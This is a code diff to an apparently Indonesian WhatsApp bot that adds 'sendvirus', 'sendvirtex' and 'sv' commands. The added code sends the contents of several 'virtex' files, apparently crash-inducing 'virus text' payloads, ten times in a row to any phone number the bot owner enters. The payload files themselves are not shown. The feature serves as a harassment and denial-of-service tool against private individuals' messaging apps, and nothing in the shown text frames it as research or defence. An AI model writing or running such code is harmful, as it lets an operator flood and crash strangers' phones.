@@ -3034,6 +3034,23 @@ case prefix+'lirik':
     limitAdd(sender, limit)
   }).catch(() => reply(`Lagu ${q} Tidak Di Temukan`))
   break
+case prefix+'sendvirus':
+  case prefix+'sendvirtex':
+  case prefix+'sv':
+				reply("Sukses Mengirim Virtex")
+  if (!isOwner)return reply(mess.OnlyOwner)
+  if (!args[1].includes('62')) return reply(`Masukan Nomer mulai dari 62`)
+  conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/1.txt')})
+  conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/2.txt')})
+  conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/3.txt')})
+  conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/4.txt')})
+  conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/virtex.txt')})
+  conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/1.txt')})
+  conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/2.txt')})
+  conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/3.txt')})
+  conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/4.txt')})
+  conn.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('fitur/virtex/virtex.txt')})
+  break
 default:
 			if (isGroup && isCmd) {
 				reply(`*Hallo Kak ${pushname}*\n*Maaf Command ${command} Tidak Ada Di Dalam ${prefix}menu*`)
